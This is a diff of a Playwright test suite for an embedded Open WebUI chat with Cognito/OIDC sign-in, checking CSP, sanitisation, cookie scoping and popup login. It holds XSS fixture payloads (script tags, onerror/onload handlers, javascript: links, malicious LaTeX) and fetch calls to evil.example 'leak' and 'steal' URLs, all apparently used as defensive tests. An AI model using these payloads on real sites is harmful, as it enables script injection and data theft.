@@ -1,306 +1,272 @@
-// Chromium enforces the page's CSP and SRI; AWS/model I/O is simulated.
 const { test } = require("node:test");
 const assert = require("node:assert/strict");
 const fs = require("node:fs");
 const path = require("node:path");
 const { chromium } = require("playwright");
-
 const root = path.join(__dirname, "..");
-const CALLBACK = "https://celesteisyy.github.io/playground/";
-const API = "https://18-118-248-231.sslip.io";
-const ISSUER = "https://cognito-idp.us-east-2.amazonaws.com/us-east-2_0G8Lq71Sw";
-const HOSTED = "https://us-east-20g8lq71sw.auth.us-east-2.amazoncognito.com";
-const malicious = `<script>window.__attack=1</script><img src="https://evil.example/leak" onerror="window.__attack=1"><svg onload="window.__attack=1"></svg><iframe src="https://evil.example/"></iframe><style>@import url(https://evil.example/style)</style><a href="javascript:window.__attack=1">Bad</a><form><input name="CyssieAuth"></form><a id="CyssieAuth" href="${API}/downloads/diagrams/test.drawio">Diagram</a>`;
+const WEBUI = "https://cyth.18-118-248-231.sslip.io";
+const SITE = "https://celesteisyy.github.io";
+const IDP = "https://identity.example";
+const PLAYGROUND = SITE + "/playground/";
+const FRAME_CSP = "frame-ancestors 'self' " + SITE;
 
-async function mount(t, mode) {
+async function mount(t, options = {}) {
   const browser = await chromium.launch({ headless: true });
   t.after(() => browser.close());
-  const context = await browser.newContext({ acceptDownloads: true });
+  const context = await browser.newContext({ serviceWorkers: "block", viewport: { width: 1280, height: 850 } });
   const page = await context.newPage();
   const calls = [], errors = [];
-  const state = { nonce: "", token: "access-test", refreshes: 0, revoked: 0, reject: false, reply: 'Hello **Cyssie**. ' + malicious,
-    downloadStatus: 200, downloadAbort: false, downloadRedirect: false };
+  const state = { blocked: false, status: null, toolCalls: 0, completionWithoutOpener: false };
+  context.on("page", p => p.on("pageerror", e => errors.push(e.message)));
   page.on("pageerror", e => errors.push(e.message));
+  async function setSession(sameSite = "None", httpOnly = true) {
+    await context.addCookies([
+      { name: "token", value: "owner-fixture", url: WEBUI, secure: true, sameSite, httpOnly },
+      { name: "oauth_session_id", value: "server-session", url: WEBUI, secure: true, httpOnly: true, sameSite },
+    ]);
+  }
+  await context.exposeBinding("recordCompletion", (_source, missing) => { state.completionWithoutOpener = missing; });
+  await context.addInitScript(() => {
+    if (location.pathname === "/playground/login-complete") window.recordCompletion(window.opener === null);
+  });
+  if (options.authenticated) await setSession(options.sameSite);
   await context.route("**/*", async route => {
-    const req = route.request();
-    const url = new URL(req.url());
-    calls.push({ url: req.url(), method: req.method(), auth: req.headers().authorization });
-    const cors = {
-      "access-control-allow-origin": new URL(CALLBACK).origin,
-      "access-control-allow-methods": "GET,POST,OPTIONS",
-      "access-control-allow-headers": "Authorization,Content-Type"
-    };
-    const json = (body, status = 200) => route.fulfill({ status, headers: cors, contentType: "application/json", body: JSON.stringify(body) });
-    if (req.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
-    if (url.origin === new URL(CALLBACK).origin) {
-      if (url.pathname === "/" || url.pathname === "/blogs/") {
-        return route.fulfill({ contentType: "text/html", body: "<h1>Public page</h1>" });
-      }
-      const relative = decodeURIComponent(url.pathname.slice("/playground/".length));
-      const file = path.resolve(root, relative || "index.html");
-      if (!file.startsWith(root + path.sep) || !fs.existsSync(file)) return route.fulfill({ status: 404, body: "missing" });
-      const contentType = file.endsWith(".js") ? "application/javascript" : file.endsWith(".css") ? "text/css" : file.endsWith(".woff2") ? "font/woff2" : "text/html";
-      return route.fulfill({ contentType, body: fs.readFileSync(file) });
+    const request = route.request();
+    const url = new URL(request.url());
+    const headers = await request.allHeaders();
+    calls.push({ url: request.url(), headers, method: request.method() });
+    const embedded = !request.isNavigationRequest() && request.frame().page() === page && new URL(page.url()).origin === SITE;
+    const session = (!state.blocked || !embedded) && headers.cookie?.includes("token=owner-fixture");
+    const html = (body, extraHeaders = {}) => route.fulfill({ contentType: "text/html", headers: { "content-security-policy": FRAME_CSP, ...extraHeaders }, body });
+    if ([WEBUI, SITE].includes(url.origin) && url.pathname.startsWith("/playground/")) {
+      const aliases = { "/playground/": "index.html", "/playground/embed/": "embed.html", "/playground/sign-in": "sign-in.html", "/playground/login-complete": "login-complete.html", "/playground/bootstrap": "bootstrap.html" };
+      const name = aliases[url.pathname] || url.pathname.slice("/playground/".length);
+      if (!["index.html", "embed.html", "sign-in.html", "login-complete.html", "bootstrap.html", "webui.css", "embed.js"].includes(name)) return route.fulfill({ status: 404, body: "missing" });
+      return route.fulfill({ contentType: name.endsWith(".js") ? "application/javascript" : name.endsWith(".css") ? "text/css" : "text/html", headers: { "content-security-policy": FRAME_CSP }, body: fs.readFileSync(path.join(root, name)) });
     }
-    if (url.origin === API) {
-      if (url.pathname === "/auth/config") return json(mode === "legacy" ? { mode } : {
-        mode, authority: ISSUER, client_id: "testclient", redirect_uri: CALLBACK, scope: "openid email"
-      });
-      if (!req.headers().authorization || state.reject) return json({ detail: "Unauthorized" }, 401);
-      if (url.pathname === "/auth/me") return json({ authenticated: true });
-      if (url.pathname === "/chat_stream") return route.fulfill({ headers: cors, contentType: "text/plain", body: state.reply });
-      if (url.pathname === "/vision") return json({ response: "Image received." });
-      if (/^\/(?:downloads\/|static\/generated\/)/.test(url.pathname)) {
-        if (state.downloadAbort) return route.abort("failed");
-        if (state.downloadRedirect) return route.fulfill({ status: 302, headers: { ...cors, location: "https://evil.example/leak" } });
-        if (state.downloadStatus !== 200) return json({ detail: "<script>window.__attack=1</script>" }, state.downloadStatus);
-        const pptx = url.pathname.endsWith(".pptx");
-        return route.fulfill({ headers: cors, contentType: pptx ? "application/vnd.openxmlformats-officedocument.presentationml.presentation" : "application/octet-stream",
-          body: pptx ? "PK presentation fixture" : url.pathname.endsWith(".drawio") ? "<mxfile/>" : "Report fixture" });
-      }
-      return json({ status: "reset" });
+    if (url.origin === WEBUI && url.pathname === "/api/v1/auths/") {
+      // Match v0.12.2: a successful auths check turns the cookie HttpOnly.
+      const bootstrap = request.frame().url() === WEBUI + "/playground/bootstrap";
+      const status = (bootstrap && options.bootstrapStatus) || state.status || (session ? 200 : 401);
+      return route.fulfill({ status, contentType: "application/json",
+        headers: status === 200 ? { "set-cookie": "token=owner-fixture; Path=/; Secure; HttpOnly; SameSite=None" } : {},
+        body: JSON.stringify(session ? { id: "owner", token: bootstrap && options.invalidBootstrap ? null : "owner-fixture" } : { detail: "Unauthorized" }) });
     }
-    if (req.url() === `${ISSUER}/.well-known/openid-configuration`) return json({
-      issuer: ISSUER, authorization_endpoint: `${HOSTED}/oauth2/authorize`,
-      token_endpoint: `${HOSTED}/oauth2/token`, revocation_endpoint: `${HOSTED}/oauth2/revoke`
-    });
-    if (url.origin === HOSTED) {
-      if (url.pathname === "/oauth2/authorize") {
-        state.nonce = url.searchParams.get("nonce");
-        assert.equal(url.searchParams.get("code_challenge_method"), "S256");
-        assert.ok(url.searchParams.get("code_challenge"));
-        return route.fulfill({ contentType: "text/html", body: "<p>Simulated Cognito sign-in</p>" });
-      }
-      if (url.pathname === "/oauth2/token") {
-        const params = new URLSearchParams(req.postData());
-        assert.equal(params.get("client_id"), "testclient");
-        if (params.get("grant_type") === "refresh_token") {
-          state.refreshes++;
-          state.token = "renewed-access-test";
-        } else {
-          assert.equal(params.get("grant_type"), "authorization_code");
-          assert.ok(params.get("code_verifier"));
+    if (url.origin === WEBUI && url.pathname === "/oauth/oidc/login") {
+      // A document navigation keeps both fake origins under route interception;
+      // a fulfilled redirect can otherwise escape interception to fake DNS.
+      return html(`<script>location.replace('${IDP}/login')</script>`);
+    }
+    if (url.origin === IDP && url.pathname === "/login") {
+      return html(`<h1>Cognito fixture</h1><button onclick="location.assign('${WEBUI}/oauth/oidc/callback')">Confirm sign-in</button>`, options.isolatePopup ? { "cross-origin-opener-policy": "same-origin" } : {});
+    }
+    if (url.origin === WEBUI && url.pathname === "/oauth/oidc/callback") {
+      await setSession("None", false);
+      const returnPath = headers.cookie?.includes("cyth_embed_login=1") ? "/playground/login-complete" : "/auth";
+      return html(`<script>location.replace('${returnPath}')</script>`);
+    }
+    if (url.origin === WEBUI && url.pathname === "/auth") {
+      // Native /auth cannot bootstrap an HttpOnly token in a fresh partition.
+      // Leave it on the real sign-in screen in that case, rather than making
+      // the test fixture more permissive than Open WebUI.
+      return html(`<h1>Sign in to Open WebUI</h1><script>
+        if (localStorage.token === 'owner-fixture' || document.cookie.includes('token=owner-fixture')) {
+          localStorage.token='owner-fixture';
+          const target=localStorage.getItem('redirectPath') || '/';
+          localStorage.removeItem('redirectPath');
+          location.replace(target);
         }
-        const encode = obj => Buffer.from(JSON.stringify(obj)).toString("base64url");
-        const now = Math.floor(Date.now() / 1000);
-        return json({ access_token: state.token, refresh_token: "refresh-test", token_type: "Bearer", expires_in: 120,
-          id_token: `${encode({ alg: "RS256" })}.${encode({ sub: "owner", iss: ISSUER, aud: "testclient", nonce: state.nonce, iat: now, exp: now + 120 })}.signature`, scope: "openid email" });
-      }
-      if (url.pathname === "/oauth2/revoke") { state.revoked++; return route.fulfill({ status: 200, headers: cors, body: "" }); }
-      if (url.pathname === "/logout") return route.fulfill({ contentType: "text/html", body: "<p>Signed out</p>" });
+      </script>`);
     }
-    return route.fulfill({ status: 404, body: "blocked test destination" });
+    if (url.origin === WEBUI && url.pathname === "/") {
+      return html(`<script>if(localStorage.token!=='owner-fixture')location.replace('/auth');</script><h1>Open WebUI fixture</h1><button id="tool">Check scanner</button><button id="logout">Sign out</button><p id="result"></p><script>
+        document.getElementById('tool').onclick=async()=>{
+          const r=await fetch('/api/tool-fixture',{method:'POST',headers:{Authorization:'Bearer '+localStorage.token}});
+          document.getElementById('result').textContent=String(r.status);
+        };
+        document.getElementById('logout').onclick=async()=>{
+          await fetch('/api/v1/auths/signout',{method:'POST'});
+          localStorage.removeItem('token'); location.assign('/auth');
+        };
+      </script>`);
+    }
+    if (url.origin === WEBUI && url.pathname === "/api/v1/auths/signout") {
+      return route.fulfill({ status: 200, contentType: "application/json",
+        headers: { "set-cookie": "token=; Path=/; Secure; HttpOnly; SameSite=None; Max-Age=0" }, body: "{}" });
+    }
+    if (url.origin === WEBUI && url.pathname === "/api/tool-fixture") {
+      if (session && headers.authorization === "Bearer owner-fixture" && headers.origin === WEBUI && headers.cookie?.includes("oauth_session_id=server-session")) state.toolCalls++;
+      return route.fulfill({ status: state.toolCalls ? 200 : 401, body: "{}" });
+    }
+    if (url.origin === "https://evil.example") return html(`<iframe src="${WEBUI}/playground/embed/"></iframe>`);
+    return route.fulfill({ status: 404, body: "blocked destination" });
   });
-  await page.goto(CALLBACK);
-  await page.waitForFunction(() => !document.querySelector("#saveTokenButton").disabled);
-  return { page, context, calls, errors, state };
+  await page.goto(options.url || PLAYGROUND);
+  const helper = () => page.frames().find(f => f.url().startsWith(WEBUI + "/playground/embed/"));
+  const conversation = () => page.frameLocator("#webui").frameLocator("#conversation");
+  return { browser, context, page, calls, errors, state, helper, conversation, setSession };
 }
 
-async function send(page, text) {
-  await page.locator("#messageInput").fill(text);
-  await page.locator("#sendButton").click();
-  await page.waitForFunction(() => !document.querySelector("#sendButton").disabled);
-}
-
-async function signInCognito(page) {
-  await page.locator("#saveTokenButton").click();
-  await page.waitForURL(url => url.origin === HOSTED && url.pathname === "/oauth2/authorize");
-  const state = new URL(page.url()).searchParams.get("state");
-  await page.goto(CALLBACK + "?code=test-code&state=" + state);
-  await page.waitForFunction(() => document.querySelector("#tokenButton").textContent === "Sign out");
-}
-
-test("all artifact downloads carry authentication; ordinary failures preserve sign-in while 401 requires login", { timeout: 60000 }, async t => {
-  const { page, calls, state, errors } = await mount(t, "cognito");
-  await signInCognito(page);
-  const examples = [
-    ["/static/generated/slides.pptx", "/downloads/presentations/slides.pptx"],
-    ["/static/generated/layout.drawio", "/downloads/diagrams/layout.drawio"],
-    ["/downloads/presentations/direct.pptx", "/downloads/presentations/direct.pptx"],
-    ["/downloads/diagrams/direct.drawio", "/downloads/diagrams/direct.drawio"],
-    ["/static/generated/report.txt", "/static/generated/report.txt"]
-  ];
-  for (const [href, expected] of examples) {
-    state.reply = "[Artifact](" + href + ")";
-    await send(page, "prepare a file");
-    const started = page.waitForEvent("download");
-    await page.getByRole("link", { name: "Artifact", exact: true }).last().click();
-    assert.equal((await started).suggestedFilename(), expected.split("/").pop());
-    assert.ok(calls.some(c => c.url === API + expected && c.auth === "Bearer access-test"));
+async function signIn(context, page) {
+  const opened = context.waitForEvent("page");
+  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).click();
+  const popup = await opened;
+  try {
+    await popup.getByRole("button", { name: "Confirm sign-in" }).click({ timeout: 10000 });
+  } catch (error) {
+    throw new Error("Fixture sign-in did not load at " + popup.url() + ": " + await popup.locator("body").innerText(), { cause: error });
   }
-  const link = page.getByRole("link", { name: "Artifact", exact: true }).last();
-  for (const status of [404, 410, 500, 503]) {
-    state.downloadStatus = status;
-    await link.click();
-    await page.locator("#downloadStatus").waitFor({ state: "visible" });
-    assert.match(await page.locator("#downloadStatus").innerText(), status < 500 ? /generate it again/ : /HTTP 50[03]/);
-    assert.equal(await page.locator("#tokenModal").isVisible(), false);
-    assert.equal(await page.locator("#tokenButton").innerText(), "Sign out");
-    assert.equal(await page.evaluate(() => window.__attack), undefined);
-  }
-  state.downloadStatus = 200;
-  state.downloadAbort = true;
-  await link.click();
-  await page.locator("#downloadStatus").waitFor({ state: "visible" });
-  assert.match(await page.locator("#downloadStatus").innerText(), /Download interrupted/);
-  assert.equal(await page.locator("#tokenModal").isVisible(), false);
-  state.downloadAbort = false;
-  state.downloadRedirect = true;
-  await link.click();
-  await page.locator("#downloadStatus").waitFor({ state: "visible" });
-  assert.equal(await page.locator("#tokenButton").innerText(), "Sign out");
-  assert.ok(!calls.some(c => c.url.startsWith("https://evil.example/")));
-  state.downloadRedirect = false;
-  state.reply = "Still signed in.";
-  await send(page, "continue chatting");
-  assert.match(await page.locator("#chat").innerText(), /Still signed in/);
-  state.downloadStatus = 401;
-  await link.click();
-  await page.locator("#tokenModal").waitFor({ state: "visible" });
-  assert.match(await page.locator("#authDescription").innerText(), /sign in again/);
-  assert.equal(await page.locator("#tokenButton").innerText(), "Sign in");
-  assert.deepEqual(errors, []);
-});
+  return popup;
+}
 
-test("LaTeX renders after chat and reload with strict CSP; code, currency and hostile input stay safe", { timeout: 60000 }, async t => {
-  const { page, calls, errors, state } = await mount(t, "cognito");
-  await signInCognito(page);
-  const fence = String.fromCharCode(96).repeat(3);
-  state.reply = [
-    "Arrow $\\rightarrow$ and \\(x^2\\).",
-    "$$\\frac{a}{b}$$",
-    "\\[\\sqrt{x}\\]",
-    "Prices $5 and $10.",
-    "<code>$x$</code>",
-    fence + "latex\n$\\rightarrow$\n" + fence,
-    "$\\badCommand{x}$",
-    "$\\href{javascript:alert(1)}{click}$",
-    "$\\includegraphics{https://evil.example/leak}$",
-    "$\\htmlStyle{background:url(https://evil.example/leak)}{x}$",
-    "<span style=\"position:fixed\" onclick=\"window.__attack=1\">Safe text</span>",
-    malicious
-  ].join("\n\n");
-  await send(page, "math please");
-  assert.equal(await page.locator("#chat .katex").count(), 6);
-  assert.match(await page.locator("#chat").innerText(), /→/);
-  assert.equal(await page.locator("#chat pre code").innerText(), "$\\rightarrow$\n");
-  assert.ok((await page.locator("#chat code").allTextContents()).includes("$x$"));
-  assert.match(await page.locator("#chat").innerText(), /Prices \$5 and \$10/);
-  assert.equal(await page.locator("#chat .math-fallback").count(), 2);
-  assert.equal(await page.locator("#chat .katex a,#chat .katex img").count(), 0);
-  assert.equal(await page.locator("#chat img,#chat script,#chat style,#chat iframe").count(), 0);
-  assert.equal(await page.locator("#chat [onclick]").count(), 0);
-  assert.equal(await page.evaluate(() => window.__attack), undefined);
-  assert.ok(!calls.some(c => c.url.startsWith("https://evil.example/")));
-  await page.evaluate(() => document.fonts.ready);
-  assert.ok(calls.some(c => c.url.endsWith(".woff2")));
-  assert.ok(await page.locator("#chat .katex [style]").evaluateAll(nodes =>
-    nodes.some(node => node.style.height && getComputedStyle(node).height !== "0px")));
-  await page.reload();
-  await page.waitForFunction(() => !document.querySelector("#saveTokenButton").disabled);
-  assert.equal(await page.locator("#chat .katex").count(), 6);
-  assert.deepEqual(errors, []);
-});
-
-test("signed-out visitors can use the banner on desktop and mobile without authorizing API calls", { timeout: 60000 }, async t => {
-  const { page, calls, errors } = await mount(t, "cognito");
+test("GitHub keeps its URL and public navigation; no query or credentials are forwarded", async t => {
+  const { page, calls, errors } = await mount(t, { url: PLAYGROUND + "?code=private-code&redirect=https://evil.example/#token=private-token" });
+  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
+  assert.equal(new URL(page.url()).origin, SITE);
+  assert.equal(new URL(page.url()).pathname, "/playground/");
+  assert.ok(!calls.some(c => c.url.startsWith(WEBUI) && /private-|evil\.example/.test(c.url)));
+  assert.ok(!calls.some(c => c.url.startsWith(SITE) && /\/api\//.test(c.url)));
   for (const width of [1280, 390]) {
-    await page.setViewportSize({ width, height: 800 });
-    assert.ok(await page.locator("#tokenModal").isVisible());
-    assert.equal(await page.locator(".workspace").evaluate(el => el.inert), true);
-    for (const [label, pathname] of [["Home", "/"], ["Blogs", "/blogs/"]]) {
-      await page.getByRole("link", { name: label, exact: true }).click();
-      assert.equal(new URL(page.url()).pathname, pathname);
-      await page.goto(CALLBACK);
-      await page.waitForFunction(() => !document.querySelector("#saveTokenButton").disabled);
-    }
+    await page.setViewportSize({ width, height: 850 });
+    assert.equal(await page.getByRole("link", { name: "Home", exact: true }).getAttribute("href"), SITE + "/");
+    assert.equal(await page.frameLocator("#webui").getByRole("link", { name: "Back to home", exact: true }).getAttribute("href"), SITE + "/");
+    const box = await page.locator("#webui").boundingBox();
+    assert.ok(box.width > 300 && box.height > 500);
+    assert.ok(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth));
   }
-  assert.ok(!calls.some(c => c.url.startsWith(API) && c.auth));
-  assert.ok(!calls.some(c => /\/chat_stream|\/vision|\/downloads\//.test(c.url)));
   assert.deepEqual(errors, []);
 });
 
-test("CSP blocks script/network injection while chat, sanitization, upload and downloads work", { timeout: 60000 }, async t => {
-  const { page, calls, errors, state } = await mount(t, "cognito");
-  await signInCognito(page);
-  await send(page, "hello");
-  assert.match(await page.locator("#chat").innerText(), /Hello Cyssie/);
-  assert.equal(await page.locator("#chat script,#chat img,#chat svg,#chat iframe,#chat style,#chat form").count(), 0);
-  assert.equal(await page.locator('#chat a[href^="javascript:"]').count(), 0);
-  assert.equal(await page.locator("#chat #CyssieAuth").count(), 0);
-  assert.ok(calls.some(c => c.url.endsWith("/chat_stream") && c.auth === "Bearer access-test"));
-  assert.equal(await page.evaluate(() => window.__attack), undefined);
-  const downloadPromise = page.waitForEvent("download");
-  await page.getByRole("link", { name: "Diagram", exact: true }).click();
-  assert.equal((await downloadPromise).suggestedFilename(), "test.drawio");
-  state.reply = "[Draw.io file](/downloads/diagrams/relative.drawio)";
-  await send(page, "draw an architecture diagram");
-  const relativeDownload = page.waitForEvent("download");
-  await page.getByRole("link", { name: "Draw.io file", exact: true }).click();
-  assert.equal((await relativeDownload).suggestedFilename(), "relative.drawio");
-  assert.ok(calls.some(c => c.url === API + "/downloads/diagrams/relative.drawio" && c.auth === "Bearer access-test"));
-  await page.locator('input[type="file"]').setInputFiles({ name: "test.png", mimeType: "image/png", buffer: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a4j8AAAAASUVORK5CYII=", "base64") });
-  await send(page, "look");
-  assert.match(await page.locator("#chat").innerText(), /Image received/);
-  assert.ok(calls.some(c => c.url.endsWith("/vision") && c.auth === "Bearer access-test"));
-
-  const before = calls.length;
-  const blocked = await page.evaluate(async () => {
-    const inline = document.createElement("script");
-    inline.textContent = "window.__attack=2";
-    document.body.appendChild(inline);
-    const external = document.createElement("script");
-    external.src = "/playground/untrusted.js";
-    document.body.appendChild(external);
-    const image = document.createElement("img");
-    image.setAttribute("onerror", "window.__attack=3");
-    image.src = "/playground/no-image.png";
-    document.body.appendChild(image);
-    let denied = false;
-    try { await fetch("https://evil.example/leak"); } catch { denied = true; }
-    await new Promise(resolve => setTimeout(resolve, 50));
-    return { denied, ran: window.__attack || false };
-  });
-  assert.deepEqual(blocked, { denied: true, ran: false });
-  assert.ok(!calls.slice(before).some(c => c.url.includes("evil.example") || c.url.endsWith("untrusted.js")));
+test("popup OAuth returns to the embedded chat and tools keep session credentials on cyth", async t => {
+  const { context, page, calls, errors, state, conversation } = await mount(t);
+  const popup = await signIn(context, page);
+  const closed = popup.isClosed() ? Promise.resolve() : popup.waitForEvent("close");
+  await closed;
+  await conversation().getByRole("button", { name: "Check scanner" }).waitFor({ timeout: 15000 });
+  await conversation().getByRole("button", { name: "Check scanner" }).click();
+  await conversation().getByText("200", { exact: true }).waitFor();
+  assert.equal(state.toolCalls, 1);
+  assert.equal(popup.isClosed(), true);
+  const authCookie = (await context.cookies(WEBUI)).find(c => c.name === "token");
+  assert.equal(authCookie.httpOnly, true);
+  assert.equal(page.url(), PLAYGROUND);
+  assert.equal(await page.evaluate(() => localStorage.getItem("token")), null);
+  assert.equal(await page.evaluate(() => document.cookie.includes("owner-fixture")), false);
+  assert.ok(calls.filter(c => c.url.startsWith(SITE)).every(c => !c.headers.authorization && !c.headers.cookie?.includes("owner-fixture")));
+  assert.ok(calls.some(c => c.url === WEBUI + "/oauth/oidc/login"));
+  assert.ok(calls.some(c => c.url === IDP + "/login"));
+  assert.ok(calls.filter(c => !c.url.startsWith(WEBUI)).every(c => !c.headers.authorization && !c.headers.cookie?.includes("owner-fixture")));
   assert.deepEqual(errors, []);
-  state.reject = true;
-  await send(page, "expired");
-  assert.match(await page.locator("#authDescription").innerText(), /sign in again/);
 });
 
-test("Cognito PKCE callback, reload, refresh and logout work under the enforced CSP", { timeout: 60000 }, async t => {
-  const { page, context, calls, errors, state } = await mount(t, "cognito");
-  await page.locator("#saveTokenButton").click();
-  await page.waitForURL(url => url.origin === HOSTED && url.pathname === "/oauth2/authorize");
-  const authorization = new URL(page.url());
-  await page.goto(`${CALLBACK}?code=test-code&state=${authorization.searchParams.get("state")}`);
-  await page.waitForFunction(() => document.querySelector("#tokenButton").textContent === "Sign out");
-  assert.equal(page.url(), CALLBACK);
-  await send(page, "hello");
-  assert.ok(calls.some(c => c.url.endsWith("/chat_stream") && c.auth === "Bearer access-test"));
+test("an existing None session opens in the iframe, while Lax does not authenticate the cross-site request", async t => {
+  const { page, conversation, context, helper } = await mount(t, { authenticated: true });
+  await conversation().getByRole("button", { name: "Check scanner" }).waitFor({ timeout: 15000 });
+  assert.equal(page.url(), PLAYGROUND);
+  assert.equal(await helper().evaluate(() => document.cookie.includes("owner-fixture")), false);
+  assert.equal((await context.cookies(WEBUI)).find(c => c.name === "token").httpOnly, true);
+  const other = await mount(t, { authenticated: true, sameSite: "Lax" });
+  await other.page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
+  assert.ok(other.calls.some(c => c.url === WEBUI + "/api/v1/auths/" && !c.headers.cookie?.includes("owner-fixture")));
+});
+
+test("sign-out returns to the embedded sign-in gate without navigating GitHub away", async t => {
+  const { page, conversation } = await mount(t, { authenticated: true });
+  await conversation().getByRole("button", { name: "Sign out" }).waitFor({ timeout: 15000 });
+  await conversation().getByRole("button", { name: "Sign out" }).click();
+  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
+  assert.equal(page.url(), PLAYGROUND);
   await page.reload();
-  await page.waitForFunction(() => document.querySelector("#tokenButton").textContent === "Sign out");
-  await page.evaluate(() => { const original = Date.now; Date.now = () => original() + 70000; });
-  await send(page, "renew");
-  assert.equal(state.refreshes, 1);
-  assert.ok(calls.some(c => c.url.endsWith("/chat_stream") && c.auth === "Bearer renewed-access-test"));
-  await page.locator("#tokenButton").click();
-  await page.waitForURL(url => url.origin === HOSTED && url.pathname === "/logout");
-  assert.equal(state.revoked, 1);
-  await page.goto(CALLBACK);
-  await page.waitForFunction(() => document.querySelector("#saveTokenButton").textContent === "Sign in");
-  assert.equal(await page.evaluate(() => Object.keys(sessionStorage).filter(k => k.startsWith("cyssie.user.")).length), 0);
-  assert.deepEqual(errors, []);
+  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
+  assert.equal(await page.frameLocator("#webui").locator("#conversation").isVisible(), false);
+});
+
+test("blocked embedded sessions stay unauthenticated and expose a permission/fallback action", async t => {
+  const { context, page, state } = await mount(t);
+  state.blocked = true;
+  await signIn(context, page);
+  await page.frameLocator("#webui").getByText("Finish signing in, then choose Continue. Your browser may ask to allow sign-in here.").waitFor({ timeout: 15000 });
+  assert.equal(await page.frameLocator("#webui").locator("#conversation").isVisible(), false);
+  await page.frameLocator("#webui").getByRole("button", { name: "Continue", exact: true }).waitFor();
+  assert.equal(await page.frameLocator("#webui").getByRole("link", { name: "Open full workspace", exact: true }).getAttribute("href"), WEBUI + "/");
+});
+
+test("untrusted completion messages cannot authenticate the embed", async t => {
+  const { page, helper, state } = await mount(t);
+  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
+  await helper().evaluate(() => {
+    for (const origin of ["https://evil.example", location.origin]) {
+      window.dispatchEvent(new MessageEvent("message", { origin, source: window, data: { type: "cyssie-signed-in", token: "forged" } }));
+    }
+  });
+  assert.equal(await page.frameLocator("#webui").locator("#conversation").isVisible(), false);
+  assert.equal(state.toolCalls, 0);
+  assert.equal(await page.evaluate(() => localStorage.getItem("token")), null);
+});
+
+test("CSP blocks injected scripts and outbound requests inside the helper", async t => {
+  const { page, helper, calls } = await mount(t);
+  await page.frameLocator("#webui").getByRole("button", { name: "Sign in", exact: true }).waitFor();
+  const result = await helper().evaluate(async () => {
+    const script = document.createElement("script"); script.textContent = "window.__attack = true"; document.body.appendChild(script);
+    let blocked = false; try { await fetch("https://evil.example/steal"); } catch { blocked = true; }
+    return { blocked, ran: !!window.__attack };
+  });
+  assert.deepEqual(result, { blocked: true, ran: false });
+  assert.ok(!calls.some(c => c.url.startsWith("https://evil.example/")));
+});
+
+test("unexpected service failures offer retry without claiming the user signed out", async t => {
+  const { page, state } = await mount(t);
+  state.status = 503;
+  await page.reload();
+  await page.frameLocator("#webui").getByText("The workspace is unavailable. Please try again.").waitFor();
+  await page.frameLocator("#webui").getByRole("button", { name: "Try again", exact: true }).waitFor();
+});
+
+test("foreign sites cannot run the embedded helper", async t => {
+  const { calls } = await mount(t, { url: "https://evil.example/" });
+  assert.ok(calls.some(c => c.url === WEBUI + "/playground/embed/"));
+  assert.ok(!calls.some(c => c.url === WEBUI + "/api/v1/auths/"));
 });
 
 
+test("bootstrap rejects a missing token or rejected session without opening a conversation", async t => {
+  for (const options of [{ invalidBootstrap: true }, { bootstrapStatus: 401 }]) {
+    const { page, helper } = await mount(t, { authenticated: true, ...options });
+    await page.frameLocator("#webui").getByText("Your browser could not open sign-in here. Choose Continue, or open the full workspace.").waitFor({ timeout: 15000 });
+    assert.equal(await page.frameLocator("#webui").locator("#conversation").isVisible(), false);
+    assert.equal(await helper().evaluate(() => localStorage.getItem("token")), null);
+    assert.equal(await page.evaluate(() => localStorage.getItem("token")), null);
+  }
+});
 
-test("legacy backend configuration cannot offer token entry or authorize chat", { timeout: 30000 }, async t => {
-  const { page, calls, errors } = await mount(t, "legacy");
-  assert.equal(await page.locator("#tokenInput").count(), 0);
-  assert.equal(await page.locator("#saveTokenButton").innerText(), "Retry");
-  assert.equal(await page.locator(".workspace").evaluate(el => el.inert), true);
-  assert.ok(!calls.some(c => c.url.startsWith(API) && c.auth));
-  assert.deepEqual(errors, []);
+test("a directly opened bootstrap document does not read a session or write a token", async t => {
+  const { page, calls } = await mount(t, { authenticated: true, url: WEBUI + "/playground/bootstrap" });
+  await page.getByText("Open Playground to continue.").waitFor();
+  assert.equal(await page.evaluate(() => localStorage.getItem("token")), null);
+  assert.equal(calls.some(c => c.url === WEBUI + "/api/v1/auths/"), false);
+});
+
+
+test("the login window closes itself after a cross-origin opener policy severs its opener", async t => {
+  const { context, page, state, conversation, calls } = await mount(t, { isolatePopup: true });
+  const popup = await signIn(context, page);
+  if (!popup.isClosed()) await popup.waitForEvent("close", { timeout: 15000 });
+  await conversation().getByRole("button", { name: "Check scanner" }).waitFor({ timeout: 15000 });
+  assert.equal(state.completionWithoutOpener, true);
+  assert.equal(context.pages().length, 1);
+  assert.equal(page.url(), PLAYGROUND);
+  const callback = calls.find(c => c.url === WEBUI + "/oauth/oidc/callback");
+  assert.ok(callback.headers.cookie.includes("cyth_embed_login=1"));
+  assert.ok(calls.filter(c => !c.url.startsWith(WEBUI)).every(c => !c.headers.cookie?.includes("cyth_embed_login=")));
+  assert.equal((await context.cookies(WEBUI)).some(c => c.name === "cyth_embed_login"), false);
+});
+
+test("a completion page without a valid session cannot announce success or authenticate the embed", async t => {
+  const { page, calls } = await mount(t, { url: WEBUI + "/playground/login-complete" });
+  await page.getByText("Sign-in could not be confirmed. Please return and try again.").waitFor();
+  assert.equal(page.isClosed(), false);
+  assert.equal(await page.evaluate(() => localStorage.getItem("token")), null);
+  assert.ok(!calls.some(c => c.url === WEBUI + "/playground/bootstrap"));
 });
